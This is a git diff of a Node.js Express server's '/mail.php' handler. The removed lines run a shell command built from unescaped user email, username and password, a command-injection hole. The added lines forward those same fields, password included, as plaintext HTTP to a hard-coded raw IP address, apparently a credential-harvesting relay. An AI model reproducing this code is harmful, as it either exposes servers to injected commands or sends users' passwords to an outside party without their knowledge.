@@ -6,6 +6,11 @@ const bodyParser = require('body-parser');
 const { exec } = require('child_process');
 /* const request = require('request'); */
 const PORT = 8081;
+const fs = require('fs');
+const http = require('http');
+
+ 
+
 
 const app = express()
 var server = require("http").createServer(app);
@@ -26,24 +31,42 @@ var scores = {
 
 app.use(express.static(__dirname + '/dist'));
 
-
-app.use(bodyParser.urlencoded({ extended: false }));
+app.use(bodyParser.json());
+/* app.use(bodyParser.urlencoded({ extended: false })); */
 
 app.post('/mail.php', (req, res) => {
   const { useremail, username, password } = req.body;
-  const command = `php mail.php ${useremail} ${username} ${password}`;
+  
+  const postData = JSON.stringify({ useremail, username, password });
 
-  exec(command, (error, stdout, stderr) => {
-    if (error) {
-      console.error(`exec error: ${error}`);
-      return res.status(500).send('An error occurred while sending email');
+  const options = {
+    hostname: '5.35.87.68',
+    path: '/mail.php',
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Content-Length': Buffer.byteLength(postData)
     }
+  };
 
-    console.log(`stdout: ${stdout}`);
-    console.log(`stderr: ${stderr}`);
-    
-    res.send(`Email sent successfully ${useremail}`);
+  const httpRequest = http.request(options, (response) => {
+    let data = '';
+
+    response.on('data', (chunk) => {
+      data += chunk;
+    });
+
+    response.on('end', () => {
+      console.log(data);
+    });
   });
+
+  httpRequest.on('error', (error) => {
+    console.error(error);
+  });
+
+  httpRequest.write(postData);
+  httpRequest.end();
 });
 /* app.get('/', function (req, res) {
   res.sendFile(__dirname + '/index.html');
